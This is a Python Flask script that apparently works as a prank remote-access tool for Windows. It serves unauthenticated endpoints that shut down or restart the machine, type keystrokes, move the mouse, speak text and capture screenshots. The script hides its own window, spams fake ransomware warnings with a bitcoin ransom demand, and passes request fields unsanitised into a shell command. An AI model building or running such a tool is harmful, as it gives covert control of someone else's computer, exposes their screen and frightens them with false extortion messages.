import os
from flask import Flask, request, jsonify
import threading
import logging
from time import sleep
import pyautogui
from gtts import gTTS
import tempfile
#logging.getLogger("Flask").setLevel(logging.WARNING)
from playsound import playsound
import socket
import numpy as np 
import cv2 

#config
hide_self = True
#end of config

counter=1
use_alt_tab=True

def clear_screen():
	global counter
	sleep(1)
	os.system('cls')
	os.system("color A")
	print("Startup Script Running.....")
	print("Host is Windows")
	print("performing tasks do not close\n"*counter)
	counter = counter+1

def thread_clear_screen():
	t = threading.Thread(target=clear_screen,args=())
	t.start()

def thread_run_vb_in_background():
	os.system("call %temp%\\TEMPmessage.vbs")
	os.system("del %temp%\\TEMPmessage.vbs /f /q")

def show_error(title,message):
	content = "echo x=MsgBox(\""+message+"\",2+16,\""+title+"\") > %temp%\\TEMPmessage.vbs"
	os.system(content)
	t = threading.Thread(target=thread_run_vb_in_background,args=())
	t.start()
	if use_alt_tab:
		pyautogui.hotkey('alt','tab')

def show_error_spam():
	global use_alt_tab
	show_error("Dead", "Hacked By Velocoraptor")
	sleep(0.5)
	use_alt_tab = False
	show_error("System Error", "System is curropted")
	sleep(0.5)
	show_error("Encrypting files", "50%")
	sleep(0.5)
	show_error("Virus Mirus", "143 accounts hijacked")
	sleep(0.5)
	show_error("Euro Miner", "Removed 34.09 euro from bank accounts")
	sleep(0.5)
	show_error("Restore Your Pc", "Pay 0.534btc to UDEIFUEU343FSRSFE343453399DFSKI")	
	use_alt_tab = True

def showtext(text,use_enter):
	if len(text) > 0:
		for letter in text:
			pyautogui.press(letter)
	if use_enter == "true":
		pyautogui.press('enter')

def text_to_speach(text,language,use_slow):
	tts = gTTS(text=text, lang=language, slow=use_slow)
	tts.save(tempfile.gettempdir()+"\\speech.mp3")
	playsound(tempfile.gettempdir()+"\\speech.mp3")
	os.system("del "+tempfile.gettempdir()+"\\speech.mp3 /f /q")


app = Flask(__name__)
#app.logger.disabled = True
#log = logging.getLogger('Flask')
#log.disabled = True


@app.route('/', methods=['GET'])
def index():
	thread_clear_screen()
	response = jsonify({'server': 'up'})
	response.headers.add('Access-Control-Allow-Origin', '*')
	return response

@app.route('/shutdown', methods=['GET'])
def shutdown():
	os.system('shutdown -s -t 0')
	thread_clear_screen()
	response = jsonify({'shutdown': 'ok'})
	response.headers.add('Access-Control-Allow-Origin', '*')
	return response

@app.route('/restart', methods=['GET'])
def restart():
	os.system('shutdown -r -t 0')
	thread_clear_screen()
	response = jsonify({'restart': 'ok'})
	response.headers.add('Access-Control-Allow-Origin', '*')
	return response	

@app.route('/alt_f4', methods=['GET'])
def alt_f4():
	pyautogui.hotkey('alt','F4')
	thread_clear_screen()
	response = jsonify({'altf4': 'ok'})
	response.headers.add('Access-Control-Allow-Origin', '*')
	return response	

@app.route('/move_mouse', methods=['GET'])
def move_mouse():
	pyautogui.moveTo(0,0,0.5)
	thread_clear_screen()
	response = jsonify({'mouse': 'moved'})
	response.headers.add('Access-Control-Allow-Origin', '*')
	return response	

@app.route('/mouse_spaz', methods=['GET'])
def mouse_spaz():
	pyautogui.move(0,1000,0.2)#down
	pyautogui.move(-1000,0,0.2)#left
	pyautogui.move(0,-1000,0.2)#up
	pyautogui.move(1000,0,0.2)#right
	thread_clear_screen()
	response = jsonify({'mouse': 'spazed'})
	response.headers.add('Access-Control-Allow-Origin', '*')
	return response	

@app.route('/showerror', methods=['POST'])
def showerror():
	title = request.form['title']
	message = request.form['message']
	t = threading.Thread(target=show_error,args=(title,message))
	t.start()
	thread_clear_screen()
	response = jsonify({'error_message': 'showed'})
	response.headers.add('Access-Control-Allow-Origin', '*')
	return response

@app.route('/text', methods=['POST'])
def text():
	text = request.form['text']
	use_enter = request.form['use_enter']
	t = threading.Thread(target=showtext,args=(text,use_enter))
	t.start()
	thread_clear_screen()
	response = jsonify({'text': 'typed'})
	response.headers.add('Access-Control-Allow-Origin', '*')
	return response

@app.route('/showerror_spam', methods=['GET'])
def showerror_spam():
	t = threading.Thread(target=show_error_spam,args=())
	t.start()
	thread_clear_screen()
	response = jsonify({'error_message': 'spammed'})
	response.headers.add('Access-Control-Allow-Origin', '*')
	return response

@app.route('/speak', methods=['POST'])
def speak():
	text = request.form['text']
	language = request.form['language']
	use_slow = request.form['slow']
	if use_slow == 'true':
		use_slow = True
	else:
		use_slow = False	
	t = threading.Thread(target=text_to_speach,args=(text,language,use_slow))
	t.start()
	thread_clear_screen()
	response = jsonify({'text': 'typed'})
	response.headers.add('Access-Control-Allow-Origin', '*')
	return response	

@app.route('/screenshot', methods=['GET'])
def screenshot():
	image = pyautogui.screenshot() 
	image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR) 
	cv2.imwrite(tempfile.gettempdir()+"\\screenshot.png", image)
	img = open(tempfile.gettempdir()+"\\screenshot.png", 'rb').read()
	response = jsonify()
	response.mimetype='image/png'
	response.data = img
	response.headers.add('Access-Control-Allow-Origin', '*')
	return response		

def main():
	t = threading.Thread(target=clear_screen,args=())
	t.start()
	if hide_self:
		os.system("powershell -window Hidden -command \"\"")
	app.run(host=get_ip(), port=80,debug=False)

def get_ip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	ipaddres = s.getsockname()[0]
	s.close()
	return ipaddres

if __name__ == '__main__':
	main()
